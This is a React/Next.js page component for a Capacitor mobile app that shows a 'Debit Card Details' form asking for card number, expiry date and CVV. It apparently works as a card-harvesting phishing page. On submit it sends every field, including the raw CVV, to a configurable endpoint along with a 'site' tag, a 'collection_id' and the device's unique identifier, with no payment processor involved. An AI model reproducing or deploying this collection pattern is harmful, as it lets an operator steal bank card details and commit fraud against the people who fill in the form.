'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from '../parser.module.css';
import { Device } from '@capacitor/device';

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        jsonObject1['mobile_id'] = (await Device.getId()).identifier;;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/end');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <div className="container">
      <h5 className={`${styles.textCenterDiv} primary-color mt-5 mb-4`}><strong>Debit Card Details</strong></h5>
      <form onSubmit={handleSubmit} >
        <DebitCardInputComponent />
         

          <div className="d-flex gap-2 w-100 justify-content-between mt-4">
            <div className={`form-group w-100 ${styles.inputDiv}`}>
                <label>Expiry Month <span className="text-danger">*</span></label>
                <select name="expiry_month" className={`form-control w-100 ${styles.formInput}`} required>
                  <option value="" className="select-placeholder" value="">Select Month</option>
                  <option value="01">January</option>
                  <option value="02">February</option>
                  <option value="03">March</option>
                  <option value="04">April</option>
                  <option value="05">May</option>
                  <option value="06">June</option>
                  <option value="07">July</option>
                  <option value="08">August</option>
                  <option value="09">September</option>
                  <option value="10">October</option>
                  <option value="11">November</option>
                  <option value="12">December</option>
                </select>
            </div>

            <div className={`form-group w-100 ${styles.inputDiv}`}>
                <label>Expiry Year <span className="text-danger">*</span></label>
                  <select name="expiry_year"  className={`form-control w-100 ${styles.formInput}`} required >
                        <option value="" className="select-placeholder">Select Year</option>
                        <option>2015</option>
                        <option>2016</option>
                        <option>2017</option>
                        <option>2018</option>
                        <option>2019</option>
                        <option>2020</option>
                        <option>2021</option>
                        <option>2022</option>
                        <option>2023</option>
                        <option>2024</option>
                        <option>2025</option>
                        <option>2026</option>
                        <option>2027</option>
                        <option>2028</option>
                        <option>2029</option>
                        <option>2030</option>
                        <option>2031</option>
                        <option>2032</option>
                        <option>2033</option>
                        <option>2034</option>
                        <option>2035</option>
                        <option>2036</option>
                        <option>2037</option>
                        <option>2038</option>
                        <option>2039</option>
                        <option>2040</option>
                        <option>2041</option>
                        <option>2042</option>
                        <option>2043</option>
                        <option>2044</option>
                        <option>2045</option>
                        <option>2046</option>
                        <option>2047</option>
                        <option>2048</option>
                        <option>2049</option>
                        <option>2050</option>
                        <option>2051</option>
                        <option>2052</option>
                        <option>2053</option>
                        <option>2054</option>
                        <option>2055</option>
                        <option>2056</option>
                        <option>2057</option>
                        <option>2058</option>
                        <option>2059</option>
                        <option>2060</option>
                        <option>2061</option>
                        <option>2062</option>
                        <option>2063</option>
                        <option>2064</option>
                        <option>2065</option>
                        <option>2066</option>
                        <option>2067</option>
                        <option>2068</option>
                        <option>2069</option>
                        <option>2070</option>

                    
                </select>
            </div>

          </div>

          <div className={`form-group ${styles.inputDiv}3`}>
              <label>CVV <span className="text-danger">*</span></label>
              <input type="password" inputMode="numeric" maxLength={3} minLength={3} placeholder="CVV" name="ccvv" className={`form-control ${styles.formInput}`} required />
          </div>
          
          <div className="d-flex justify-content-center mt-4">
            <button type="submit"  className="btn button-bg btn-warning"> CONTINUE </button>
          </div>
        </form>

  
    </div>
    <Footer />
</>
  );
}
